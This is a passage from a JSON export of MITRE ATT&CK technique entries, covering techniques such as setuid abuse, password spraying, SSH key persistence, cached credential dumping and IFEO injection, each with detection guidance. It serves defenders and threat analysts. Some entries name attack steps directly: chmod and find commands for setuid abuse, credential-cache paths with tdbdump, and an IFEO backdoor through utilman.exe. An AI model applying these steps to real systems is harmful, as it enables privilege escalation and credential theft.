        "File: File Metadata",
        "Windows Registry: Windows Registry Key Modification"
      ],
      "defense_bypassed": [],
      "detection": "Monitor the file system for files that have the setuid or setgid bits set. Also look for any process API calls for behavior that may be indicative of [Process Injection](https://attack.mitre.org/techniques/T1055) and unusual loaded DLLs through [DLL](https://attack.mitre.org/techniques/T1574/001), which indicate attempts to gain access to higher privileged processes. On Linux, auditd can alert every time a user's actual ID and effective ID are different (this is what happens when you sudo).\n\nConsider monitoring for <code>/usr/libexec/security_authtrampoline</code> executions which may indicate that AuthorizationExecuteWithPrivileges is being executed. MacOS system logs may also indicate when AuthorizationExecuteWithPrivileges is being called. Monitoring OS API callbacks for the execution can also be a way to detect this behavior but requires specialized security tooling.\n\nOn Linux, auditd can alert every time a user's actual ID and effective ID are different (this is what happens when you sudo). This technique is abusing normal functionality in macOS and Linux systems, but sudo has the ability to log all input and output based on the <code>LOG_INPUT</code> and <code>LOG_OUTPUT</code> directives in the <code>/etc/sudoers</code> file.\n\nThere are many ways to perform UAC bypasses when a user is in the local administrator group on a system, so it may be difficult to target detection on all variations. Efforts should likely be placed on mitigation and collecting enough information on process launches and actions that could be performed before and after a UAC bypass is performed. Some UAC bypass methods rely on modifying specific, user-accessible Registry settings. Analysts should monitor Registry settings for unauthorized changes."
    },
    "T1134.002": {
      "id": "T1134.002",
      "name": "Create Process with Token",
      "description": "Adversaries may create a new process with an existing token to escalate privileges and bypass access controls. Processes can be created with the token and resulting security context of another user using features such as <code>CreateProcessWithTokenW</code> and <code>runas</code>.(Citation: Microsoft RunAs)\n\nCreating processes with a token not associated with the current user may require the credentials of the target user, specific privileges to impersonate that user, or access to the token to be used. For example, the token could be duplicated via [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) or created via [Make and Impersonate Token](https://attack.mitre.org/techniques/T1134/003) before being used to create a process.\n\nWhile this technique is distinct from [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001), the techniques can be used in conjunction where a token is duplicated and then used to create a new process.",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1134.002",
      "stix_id": "attack-pattern--677569f9-a8b0-459e-ab24-7f18091fa7bf",
      "created": "2020-02-18T16:48:56.582000+00:00",
      "modified": "2025-04-16T20:37:17.537000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution",
        "Process: OS API Execution"
      ],
      "defense_bypassed": [],
      "detection": "If an adversary is using a standard command-line shell (i.e. [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003)), analysts may detect token manipulation by auditing command-line activity. Specifically, analysts should look for use of the <code>runas</code> command or similar artifacts. Detailed command-line logging is not enabled by default in Windows.(Citation: Microsoft Command-line Logging)\n\nIf an adversary is using a payload that calls the Windows token APIs directly, analysts may detect token manipulation only through careful analysis of user activity, examination of running processes, and correlation with other endpoint and network behavior.\n\nAnalysts can also monitor for use of Windows APIs such as <code>CreateProcessWithTokenW</code> and correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators."
    },
    "T1548.001": {
      "id": "T1548.001",
      "name": "Setuid and Setgid",
      "description": "An adversary may abuse configurations where an application has the setuid or setgid bits set in order to get code running in a different (and possibly more privileged) user\u2019s context. On Linux or macOS, when the setuid or setgid bits are set for an application binary, the application will run with the privileges of the owning user or group respectively.(Citation: setuid man page) Normally an application is run in the current user\u2019s context, regardless of which user or group owns the application. However, there are instances where programs need to be executed in an elevated context to function properly, but the user running them may not have the specific required privileges.\n\nInstead of creating an entry in the sudoers file, which must be done by root, any user can specify the setuid or setgid flag to be set for their own applications (i.e. [Linux and Mac File and Directory Permissions Modification](https://attack.mitre.org/techniques/T1222/002)). The <code>chmod</code> command can set these bits with bitmasking, <code>chmod 4777 [file]</code> or via shorthand naming, <code>chmod u+s [file]</code>. This will enable the setuid bit. To enable the setgid bit, <code>chmod 2775</code> and <code>chmod g+s</code> can be used.\n\nAdversaries can use this mechanism on their own malware to make sure they're able to execute in elevated contexts in the future.(Citation: OSX Keydnap malware) This abuse is often part of a \"shell escape\" or other actions to bypass an execution environment with restricted permissions.\n\nAlternatively, adversaries may choose to find and target vulnerable binaries with the setuid or setgid bits already enabled (i.e. [File and Directory Discovery](https://attack.mitre.org/techniques/T1083)). The setuid and setguid bits are indicated with an \"s\" instead of an \"x\" when viewing a file's attributes via <code>ls -l</code>. The <code>find</code> command can also be used to search for such files. For example, <code>find / -perm +4000 2>/dev/null</code> can be used to find files with setuid set and <code>find / -perm +2000 2>/dev/null</code> may be used for setgid. Binaries that have these bits set may then be abused by adversaries.(Citation: GTFOBins Suid)",
      "tactic": "privilege-escalation",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1548.001",
      "stix_id": "attack-pattern--6831414d-bb70-42b7-8030-d4e06b2660c9",
      "created": "2020-01-30T14:11:41.212000+00:00",
      "modified": "2025-04-16T20:37:17.707000+00:00",
      "platforms": [
        "Linux",
        "macOS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution",
        "File: File Metadata",
        "File: File Modification"
      ],
      "defense_bypassed": [],
      "detection": "Monitor the file system for files that have the setuid or setgid bits set. Monitor for execution of utilities, like chmod, and their command-line arguments to look for setuid or setguid bits being set."
    },
    "T1547.004": {
      "id": "T1547.004",
      "name": "Winlogon Helper DLL",
      "description": "Adversaries may abuse features of Winlogon to execute DLLs and/or executables when a user logs in. Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. Registry entries in <code>HKLM\\Software[\\\\Wow6432Node\\\\]\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\</code> and <code>HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\</code> are used to manage additional helper programs and functionalities that support Winlogon.(Citation: Cylance Reg Persistence Sept 2013) \n\nMalicious modifications to these Registry keys may cause Winlogon to load and execute malicious DLLs and/or executables. Specifically, the following subkeys have been known to be possibly vulnerable to abuse: (Citation: Cylance Reg Persistence Sept 2013)\n\n* Winlogon\\Notify - points to notification package DLLs that handle Winlogon events\n* Winlogon\\Userinit - points to userinit.exe, the user initialization program executed when a user logs on\n* Winlogon\\Shell - points to explorer.exe, the system shell executed when a user logs on\n\nAdversaries may take advantage of these features to repeatedly execute malicious code and establish persistence.",
      "tactic": "persistence",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1547.004",
      "stix_id": "attack-pattern--6836813e-8ec8-4375-b459-abb388cb1a35",
      "created": "2020-01-24T16:59:59.688000+00:00",
      "modified": "2025-04-15T19:58:37.982000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution",
        "Module: Module Load",
        "Process: Process Creation",
        "Windows Registry: Windows Registry Key Modification"
      ],
      "defense_bypassed": [],
      "detection": "Monitor for changes to Registry entries associated with Winlogon that do not correlate with known software, patch cycles, etc. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current Winlogon helper values. (Citation: TechNet Autoruns)  New DLLs written to System32 that do not correlate with known good software or patching may also be suspicious.\n\nLook for abnormal process behavior that may be due to a process loading a malicious DLL. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement."
    },
    "T1021.003": {
      "id": "T1021.003",
      "name": "Distributed Component Object Model",
      "description": "Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to interact with remote machines by taking advantage of Distributed Component Object Model (DCOM). The adversary may then perform actions as the logged-on user.\n\nThe Windows Component Object Model (COM) is a component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces. Through COM, a client object can call methods of server objects, which are typically Dynamic Link Libraries (DLL) or executables (EXE). Distributed COM (DCOM) is transparent middleware that extends the functionality of COM beyond a local computer using remote procedure call (RPC) technology.(Citation: Fireeye Hunting COM June 2019)(Citation: Microsoft COM)\n\nPermissions to interact with local and remote server COM objects are specified by access control lists (ACL) in the Registry.(Citation: Microsoft Process Wide Com Keys) By default, only Administrators may remotely activate and launch COM objects through DCOM.(Citation: Microsoft COM ACL)\n\nThrough DCOM, adversaries operating in the context of an appropriately privileged user can remotely obtain arbitrary and even direct shellcode execution through Office applications(Citation: Enigma Outlook DCOM Lateral Movement Nov 2017) as well as other Windows objects that contain insecure methods.(Citation: Enigma MMC20 COM Jan 2017)(Citation: Enigma DCOM Lateral Movement Jan 2017) DCOM can also execute macros in existing documents(Citation: Enigma Excel DCOM Sept 2017) and may also invoke [Dynamic Data Exchange](https://attack.mitre.org/techniques/T1559/002) (DDE) execution directly through a COM created instance of a Microsoft Office application(Citation: Cyberreason DCOM DDE Lateral Movement Nov 2017), bypassing the need for a malicious document. DCOM can be used as a method of remotely interacting with [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047). (Citation: MSDN WMI)",
      "tactic": "lateral-movement",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1021.003",
      "stix_id": "attack-pattern--68a0c5ed-bee2-4513-830d-5b0d650139bd",
      "created": "2020-02-11T18:26:36.444000+00:00",
      "modified": "2025-04-15T22:20:51.024000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Connection Creation",
        "Module: Module Load",
        "Process: Process Creation"
      ],
      "defense_bypassed": [],
      "detection": "Monitor for COM objects loading DLLs and other modules not typically associated with the application.(Citation: Enigma Outlook DCOM Lateral Movement Nov 2017) Enumeration of COM objects, via [Query Registry](https://attack.mitre.org/techniques/T1012) or [PowerShell](https://attack.mitre.org/techniques/T1059/001), may also proceed malicious use.(Citation: Fireeye Hunting COM June 2019)(Citation: Enigma MMC20 COM Jan 2017) Monitor for spawning of processes associated with COM objects, especially those invoked by a user different than the one currently logged on.\n\nMonitor for any influxes or abnormal increases in DCOM related Distributed Computing Environment/Remote Procedure Call (DCE/RPC) traffic (typically over port 135)."
    },
    "T1110.003": {
      "id": "T1110.003",
      "name": "Password Spraying",
      "description": "Adversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials. Password spraying uses one password (e.g. 'Password01'), or a small list of commonly used passwords, that may match the complexity policy of the domain. Logins are attempted with that password against many different accounts on a network to avoid account lockouts that would normally occur when brute forcing a single account with many passwords. (Citation: BlackHillsInfosec Password Spraying)\n\nTypically, management services over commonly used ports are used when password spraying. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018)\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
      "tactic": "credential-access",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1110.003",
      "stix_id": "attack-pattern--692074ae-bb62-4a5e-a735-02cb6bde458c",
      "created": "2020-02-11T18:39:25.122000+00:00",
      "modified": "2025-04-15T19:58:38.420000+00:00",
      "platforms": [
        "Containers",
        "IaaS",
        "Identity Provider",
        "Linux",
        "Network Devices",
        "Office Suite",
        "SaaS",
        "Windows",
        "macOS",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "User Account: User Account Authentication",
        "Application Log: Application Log Content"
      ],
      "defense_bypassed": [],
      "detection": "Monitor authentication logs for system and application login failures of [Valid Accounts](https://attack.mitre.org/techniques/T1078). Specifically, monitor for many failed authentication attempts across various accounts that may result from password spraying attempts.\n\nConsider the following event IDs:(Citation: Trimarc Detecting Password Spraying)\n\n* Domain Controllers: \"Audit Logon\" (Success & Failure) for event ID 4625.\n* Domain Controllers: \"Audit Kerberos Authentication Service\" (Success & Failure) for event ID 4771.\n* All systems: \"Audit Logon\" (Success & Failure) for event ID 4648."
    },
    "T1090.002": {
      "id": "T1090.002",
      "name": "External Proxy",
      "description": "Adversaries may use an external proxy to act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, and ZXPortMap. (Citation: Trend Micro APT Attack Tools) Adversaries use these types of proxies to manage command and control communications, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths to avoid suspicion.\n\nExternal connection proxies are used to mask the destination of C2 traffic and are typically implemented with port redirectors. Compromised systems outside of the victim environment may be used for these purposes, as well as purchased infrastructure such as cloud-based resources or virtual private servers. Proxies may be chosen based on the low likelihood that a connection to them from a compromised system would be investigated. Victim systems would communicate directly with the external proxy on the Internet and then the proxy would forward communications to the C2 server.",
      "tactic": "command-and-control",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1090.002",
      "stix_id": "attack-pattern--69b8fd78-40e8-4600-ae4d-662c9d7afdb3",
      "created": "2020-03-14T23:12:18.466000+00:00",
      "modified": "2025-04-15T19:58:38.556000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "Network Devices",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Connection Creation",
        "Network Traffic: Network Traffic Content",
        "Network Traffic: Network Traffic Flow"
      ],
      "defense_bypassed": [],
      "detection": "Analyze network data for uncommon data flows, such as a client sending significantly more data than it receives from an external server. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)"
    },
    "T1056.003": {
      "id": "T1056.003",
      "name": "Web Portal Capture",
      "description": "Adversaries may install code on externally facing portals, such as a VPN login page, to capture and transmit credentials of users who attempt to log into the service. For example, a compromised login page may log provided user credentials before logging the user in to the service.\n\nThis variation on input capture may be conducted post-compromise using legitimate administrative access as a backup measure to maintain network access through [External Remote Services](https://attack.mitre.org/techniques/T1133) and [Valid Accounts](https://attack.mitre.org/techniques/T1078) or as part of the initial compromise by exploitation of the externally facing web service.(Citation: Volexity Virtual Private Keylogging)",
      "tactic": "collection",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1056.003",
      "stix_id": "attack-pattern--69e5226d-05dc-4f15-95d7-44f5ed78d06e",
      "created": "2020-02-11T18:59:50.058000+00:00",
      "modified": "2025-04-15T19:58:38.649000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Modification"
      ],
      "defense_bypassed": [],
      "detection": "File monitoring may be used to detect changes to files in the Web directory for organization login pages that do not match with authorized updates to the Web server's content."
    },
    "T1589.002": {
      "id": "T1589.002",
      "name": "Email Addresses",
      "description": "Adversaries may gather email addresses that can be used during targeting. Even if internal instances exist, organizations may have public-facing email infrastructure and addresses for employees.\n\nAdversaries may easily gather email addresses, since they may be readily available and exposed via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: HackersArise Email)(Citation: CNET Leaks) Email addresses could also be enumerated via more active means (i.e. [Active Scanning](https://attack.mitre.org/techniques/T1595)), such as probing and analyzing responses from authentication services that may reveal valid usernames in a system.(Citation: GrimBlog UsernameEnum) For example, adversaries may be able to enumerate email addresses in Office 365 environments by querying a variety of publicly available API endpoints, such as autodiscover and GetCredentialType.(Citation: GitHub Office 365 User Enumeration)(Citation: Azure Active Directory Reconnaisance)\n\nGathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Email Accounts](https://attack.mitre.org/techniques/T1586/002)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566) or [Brute Force](https://attack.mitre.org/techniques/T1110) via [External Remote Services](https://attack.mitre.org/techniques/T1133)).",
      "tactic": "reconnaissance",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1589.002",
      "stix_id": "attack-pattern--69f897fd-12a9-4c89-ad6a-46d2f3c38262",
      "created": "2020-10-02T14:56:24.866000+00:00",
      "modified": "2025-04-15T22:26:21.953000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Traffic Content"
      ],
      "defense_bypassed": [],
      "detection": "Monitor for suspicious network traffic that could be indicative of probing for email addresses and/or usernames, such as large/iterative quantities of authentication requests originating from a single source (especially if the source is known to be associated with an adversary/botnet). Analyzing web metadata may also reveal artifacts that can be attributed to potentially malicious activity, such as referer or user-agent string HTTP/S fields.\n\nMuch of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access."
    },
    "T1598.004": {
      "id": "T1598.004",
      "name": "Spearphishing Voice",
      "description": "Adversaries may use voice communications to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Impersonation](https://attack.mitre.org/techniques/T1656)) and/or creating a sense of urgency or alarm for the recipient.\n\nAll forms of phishing are electronically delivered social engineering. In this scenario, adversaries use phone calls to elicit sensitive information from victims. Known as voice phishing (or \"vishing\"), these communications can be manually executed by adversaries, hired call centers, or even automated via robocalls. Voice phishers may spoof their phone number while also posing as a trusted entity, such as a business partner or technical support staff.(Citation: BOA Telephone Scams)\n\nVictims may also receive phishing messages that direct them to call a phone number (\"callback phishing\") where the adversary attempts to collect confidential information.(Citation: Avertium callback phishing)\n\nAdversaries may also use information from previous reconnaissance efforts (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)) to tailor pretexts to be even more persuasive and believable for the victim.",
      "tactic": "reconnaissance",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1598.004",
      "stix_id": "attack-pattern--6a5d222a-a7e0-4656-b110-782c33098289",
      "created": "2023-09-07T21:48:39.516000+00:00",
      "modified": "2025-04-15T23:11:31.420000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [
        "Application Log: Application Log Content"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1003.005": {
      "id": "T1003.005",
      "name": "Cached Domain Credentials",
      "description": "Adversaries may attempt to access cached domain credentials used to allow authentication to occur in the event a domain controller is unavailable.(Citation: Microsoft - Cached Creds)\n\nOn Windows Vista and newer, the hash format is DCC2 (Domain Cached Credentials version 2) hash, also known as MS-Cache v2 hash.(Citation: PassLib mscache) The number of default cached credentials varies and can be altered per system. This hash does not allow pass-the-hash style attacks, and instead requires [Password Cracking](https://attack.mitre.org/techniques/T1110/002) to recover the plaintext password.(Citation: ired mscache)\n\nOn Linux systems, Active Directory credentials can be accessed through caches maintained by software like System Security Services Daemon (SSSD) or Quest Authentication Services (formerly VAS). Cached credential hashes are typically located at `/var/lib/sss/db/cache.[domain].ldb` for SSSD or `/var/opt/quest/vas/authcache/vas_auth.vdb` for Quest. Adversaries can use utilities, such as `tdbdump`, on these database files to dump the cached hashes and use [Password Cracking](https://attack.mitre.org/techniques/T1110/002) to obtain the plaintext password.(Citation: Brining MimiKatz to Unix) \n\nWith SYSTEM or sudo access, the tools/utilities such as [Mimikatz](https://attack.mitre.org/software/S0002), [Reg](https://attack.mitre.org/software/S0075), and secretsdump.py for Windows or Linikatz for Linux can be used to extract the cached credentials.(Citation: Brining MimiKatz to Unix)\n\nNote: Cached credentials for Windows Vista are derived using PBKDF2.(Citation: PassLib mscache)",
      "tactic": "credential-access",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1003.005",
      "stix_id": "attack-pattern--6add2ab5-2711-4e9d-87c8-7a0be8531530",
      "created": "2020-02-21T15:42:25.991000+00:00",
      "modified": "2025-04-15T21:55:45.923000+00:00",
      "platforms": [
        "Windows",
        "Linux"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution"
      ],
      "defense_bypassed": [],
      "detection": "Monitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like Mimikatz. PowerShell scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,(Citation: Powersploit) which may require additional logging features to be configured in the operating system to collect necessary information for analysis.\n\nDetection of compromised [Valid Accounts](https://attack.mitre.org/techniques/T1078) in-use by adversaries may help as well."
    },
    "T1098.004": {
      "id": "T1098.004",
      "name": "SSH Authorized Keys",
      "description": "Adversaries may modify the SSH <code>authorized_keys</code> file to maintain persistence on a victim host. Linux distributions, macOS, and ESXi hypervisors commonly use key-based authentication to secure the authentication process of SSH sessions for remote management. The <code>authorized_keys</code> file in SSH specifies the SSH keys that can be used for logging into the user account for which the file is configured. This file is usually found in the user's home directory under <code>&lt;user-home&gt;/.ssh/authorized_keys</code> (or, on ESXi, `/etc/ssh/keys-<username>/authorized_keys`).(Citation: SSH Authorized Keys) Users may edit the system\u2019s SSH config file to modify the directives `PubkeyAuthentication` and `RSAAuthentication` to the value `yes` to ensure public key and RSA authentication are enabled, as well as modify the directive `PermitRootLogin` to the value `yes` to enable root authentication via SSH.(Citation: Broadcom ESXi SSH) The SSH config file is usually located under <code>/etc/ssh/sshd_config</code>.\n\nAdversaries may modify SSH <code>authorized_keys</code> files directly with scripts or shell commands to add their own adversary-supplied public keys. In cloud environments, adversaries may be able to modify the SSH authorized_keys file of a particular virtual machine via the command line interface or rest API. For example, by using the Google Cloud CLI\u2019s \u201cadd-metadata\u201d command an adversary may add SSH keys to a user account.(Citation: Google Cloud Add Metadata)(Citation: Google Cloud Privilege Escalation) Similarly, in Azure, an adversary may update the authorized_keys file of a virtual machine via a PATCH request to the API.(Citation: Azure Update Virtual Machines) This ensures that an adversary possessing the corresponding private key may log in as an existing user via SSH.(Citation: Venafi SSH Key Abuse)(Citation: Cybereason Linux Exim Worm) It may also lead to privilege escalation where the virtual machine or instance has distinct permissions from the requesting user.\n\nWhere authorized_keys files are modified via cloud APIs or command line interfaces, an adversary may achieve privilege escalation on the target virtual machine if they add a key to a higher-privileged user. \n\nSSH keys can also be added to accounts on network devices, such as with the `ip ssh pubkey-chain` [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) command.(Citation: cisco_ip_ssh_pubkey_ch_cmd)",
      "tactic": "persistence",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1098.004",
      "stix_id": "attack-pattern--6b57dc31-b814-4a03-8706-28bc20d739c4",
      "created": "2020-06-24T12:42:35.144000+00:00",
      "modified": "2025-04-15T19:58:39.342000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "IaaS",
        "Network Devices",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution",
        "Process: Process Creation",
        "File: File Modification"
      ],
      "defense_bypassed": [],
      "detection": "Use file integrity monitoring to detect changes made to the <code>authorized_keys</code> file for each user on a system. Monitor for suspicious processes modifying the <code>authorized_keys</code> file. In cloud environments, monitor instances for modification of metadata and configurations.\n\nMonitor for changes to and suspicious processes modifiying <code>/etc/ssh/sshd_config</code>.\n\nFor network infrastructure devices, collect AAA logging to monitor for rogue SSH keys being added to accounts."
    },
    "T1673": {
      "id": "T1673",
      "name": "Virtual Machine Discovery",
      "description": "An adversary may attempt to enumerate running virtual machines (VMs) after gaining access to a host or hypervisor. For example, adversaries may enumerate a list of VMs on an ESXi hypervisor using a [Hypervisor CLI](https://attack.mitre.org/techniques/T1059/012) such as `esxcli` or `vim-cmd` (e.g. `esxcli vm process list or vim-cmd vmsvc/getallvms`).(Citation: Crowdstrike Hypervisor Jackpotting Pt 2 2021)(Citation: TrendMicro Play) Adversaries may also directly leverage a graphical user interface, such as VMware vCenter, in order to view virtual machines on a host. \n\nAdversaries may use the information from [Virtual Machine Discovery](https://attack.mitre.org/techniques/T1673) during discovery to shape follow-on behaviors. Subsequently discovered VMs may be leveraged for follow-on activities such as [Service Stop](https://attack.mitre.org/techniques/T1489) or [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486).(Citation: Crowdstrike Hypervisor Jackpotting Pt 2 2021)",
      "tactic": "discovery",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1673",
      "stix_id": "attack-pattern--6bc7f9aa-b91f-4b23-84b8-5e756eba68eb",
      "created": "2025-03-27T15:32:17.400000+00:00",
      "modified": "2025-04-15T21:24:32.155000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1590.006": {
      "id": "T1590.006",
      "name": "Network Security Appliances",
      "description": "Adversaries may gather information about the victim's network security appliances that can be used during targeting. Information about network security appliances may include a variety of details, such as the existence and specifics of deployed firewalls, content filters, and proxies/bastion hosts. Adversaries may also target information about victim network-based intrusion detection systems (NIDS) or other appliances related to defensive cybersecurity operations.\n\nAdversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598).(Citation: Nmap Firewalls NIDS) Information about network security appliances may also be exposed to adversaries via online or other accessible data sets (ex: [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)).",
      "tactic": "reconnaissance",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1590.006",
      "stix_id": "attack-pattern--6c2957f9-502a-478c-b1dd-d626c0659413",
      "created": "2020-10-02T16:01:35.350000+00:00",
      "modified": "2025-04-15T22:52:16.483000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [],
      "defense_bypassed": [],
      "detection": "Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access."
    },
    "T1546.012": {
      "id": "T1546.012",
      "name": "Image File Execution Options Injection",
      "description": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by Image File Execution Options (IFEO) debuggers. IFEOs enable a developer to attach a debugger to an application. When a process is created, a debugger present in an application\u2019s IFEO will be prepended to the application\u2019s name, effectively launching the new process under the debugger (e.g., <code>C:\\dbg\\ntsd.exe -g  notepad.exe</code>). (Citation: Microsoft Dev Blog IFEO Mar 2010)\n\nIFEOs can be set directly via the Registry or in Global Flags via the GFlags tool. (Citation: Microsoft GFlags Mar 2017) IFEOs are represented as <code>Debugger</code> values in the Registry under <code>HKLM\\SOFTWARE{\\Wow6432Node}\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\<executable></code> where <code>&lt;executable&gt;</code> is the binary on which the debugger is attached. (Citation: Microsoft Dev Blog IFEO Mar 2010)\n\nIFEOs can also enable an arbitrary monitor program to be launched when a specified program silently exits (i.e. is prematurely terminated by itself or a second, non kernel-mode process). (Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018) Similar to debuggers, silent exit monitoring can be enabled through GFlags and/or by directly modifying IFEO and silent process exit Registry values in <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\</code>. (Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018)\n\nSimilar to [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), on Windows Vista and later as well as Windows Server 2008 and later, a Registry key may be modified that configures \"cmd.exe,\" or another program that provides backdoor access, as a \"debugger\" for an accessibility program (ex: utilman.exe). After the Registry is modified, pressing the appropriate key combination at the login screen while at the keyboard or when connected with [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) will cause the \"debugger\" program to be executed with SYSTEM privileges. (Citation: Tilbury 2014)\n\nSimilar to [Process Injection](https://attack.mitre.org/techniques/T1055), these values may also be abused to obtain privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer. (Citation: Elastic Process Injection July 2017) Installing IFEO mechanisms may also provide Persistence via continuous triggered invocation.\n\nMalware may also use IFEO to [Impair Defenses](https://attack.mitre.org/techniques/T1562) by registering invalid debuggers that redirect and effectively disable various system and security applications. (Citation: FSecure Hupigon) (Citation: Symantec Ushedix June 2008)",
      "tactic": "privilege-escalation",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1546.012",
      "stix_id": "attack-pattern--6d4a7fb3-5a24-42be-ae61-6728a2b581f6",
      "created": "2020-01-24T15:05:58.384000+00:00",
      "modified": "2025-04-15T19:58:39.823000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution",
        "Windows Registry: Windows Registry Key Modification",
        "Process: Process Creation"
      ],
      "defense_bypassed": [],
